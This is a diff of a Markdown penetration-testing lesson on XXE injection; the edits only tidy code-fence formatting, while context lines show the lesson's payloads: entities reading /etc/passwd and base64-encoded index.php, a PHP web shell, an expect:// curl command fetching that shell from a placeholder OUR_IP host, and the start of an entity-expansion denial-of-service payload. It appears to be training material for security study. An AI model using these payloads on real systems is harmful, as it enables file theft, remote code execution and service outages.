@@ -30,8 +30,7 @@ We see that the value of the `email` element is being displayed back to us on th
 
 For now, we know that whatever value we place in the `<email></email>` element gets displayed in the HTTP response. So, let us try to define a new entity and then use it as a variable in the `email` element to see whether it gets replaced with the value we defined. To do so, we can use what we learned in the previous section for defining new XML entities and add the following lines after the first line in the XML input:
 
-```
-        xml
+```xml
 <!DOCTYPE email [
   <!ENTITY company "Inlane Freight">
 ]>
@@ -53,8 +52,7 @@ As we can see, the response did use the value of the entity we defined (`Inlane 
 
 Now that we can define new internal XML entities let's see if we can define external XML entities. Doing so is fairly similar to what we did earlier, but we'll just add the `SYSTEM` keyword and define the external reference path after it, as we have learned in the previous section:
 
-```
-        xml
+```xml
 <!DOCTYPE email [
   <!ENTITY company SYSTEM "file:///etc/passwd">
 ]>
@@ -82,8 +80,7 @@ As we can see, this did not work, as we did not get any content. This happened b
 
 Luckily, PHP provides wrapper filters that allow us to base64 encode certain resources 'including files', in which case the final base64 output should not break the XML format. To do so, instead of using `file://` as our reference, we will use PHP's `php://filter/` wrapper. With this filter, we can specify the `convert.base64-encode` encoder as our filter, and then add an input resource (e.g. `resource=index.php`), as follows:
 
-```
-        xml
+```xml
 <!DOCTYPE email [
   <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
 ]>
@@ -107,16 +104,14 @@ If the XXE directly prints its output 'as shown in this section', then we can ex
 
 The most efficient method to turn XXE into RCE is by fetching a web shell from our server and writing it to the web app, and then we can interact with it to execute commands. To do so, we can start by writing a basic PHP web shell and starting a python web server, as follows:
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
 hiimeins@htb[/htb]$ sudo python3 -m http.server 80
 ```
 
 Now, we can use the following XML code to execute a `curl` command that downloads our web shell into the remote server:
 
-```
-        xml
+```xml
 <?xml version="1.0"?>
 <!DOCTYPE email [
   <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
@@ -141,8 +136,7 @@ Another common attack often carried out through XXE vulnerabilities is SSRF expl
 
 Finally, one common use of XXE attacks is causing a Denial of Service (DOS) to the hosting web server, with the use the following payload:
 
-```
-        xml
+```xml
 <?xml version="1.0"?>
 <!DOCTYPE email [
   <!ENTITY a0 "DOS" >
